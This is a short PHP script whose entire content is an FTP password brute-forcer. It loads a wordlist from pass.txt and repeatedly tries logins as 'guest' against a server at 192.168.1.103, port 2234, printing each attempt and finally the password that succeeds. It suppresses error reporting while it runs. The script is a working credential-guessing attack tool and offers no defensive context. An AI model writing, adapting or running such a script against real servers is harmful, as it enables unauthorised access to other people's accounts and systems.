<?php

function ftpbrute() {
  
    $user = 'guest';
    $host = '192.168.1.103';
    $passlist = file_get_contents('pass.txt');
    $port = 2234;
    $timeout = 25;
    
    $passes = explode("\n", $passlist);
    $i = 1;
    foreach ($passes as $pass) {
        error_reporting(0);
        echo "[*]Testing " . $user . " && " . $pass . "\n";
        $con = ftp_connect($host, $port, $timeout);
        $login = ftp_login($con, $user, $pass);

        if (!$login) {
            ftp_close($con);
            $i++;

        } else {
            echo "Password encoded\n";
            echo "Made " . $i . " attempts\n";
            echo "User: " . $user . " Password: " . $pass . "\n";
            break;
        }
    }
}

ftpbrute(); 